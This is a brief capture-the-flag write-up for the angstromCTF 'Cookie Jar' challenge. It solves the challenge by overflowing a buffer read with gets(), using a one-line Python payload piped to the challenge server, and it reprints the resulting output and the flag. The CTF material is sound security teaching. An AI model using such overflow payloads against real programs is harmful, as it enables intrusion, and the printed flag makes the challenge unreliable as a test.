# Cookie Jar
binary - 60 points

## Challenge 
Note: Binary has been updated

Try to break this [Cookie Jar](cookiePublic64) that was compiled from this [source](cookiePublic.c) Once you've pwned the binary, test it out by connecting to `nc shell.angstromctf.com 1234` to get the flag.

## Hint
Look up some vulnerabilities associated with buffers.

## Solution

Buffer overflow of `gets()`

	$ python -c 'print "A"*72 + "\xFF" ' | nc shell.angstromctf.com 1234
	Welcome to the Cookie Jar program!

	In order to get the flag, you will need to have 100 cookies!

	So, how many cookies are there in the cookie jar: 
	Congrats, you have 255 cookies!
	Here's your flag: actf{eat_cookies_get_buffer}

## Flag

	actf{eat_cookies_get_buffer}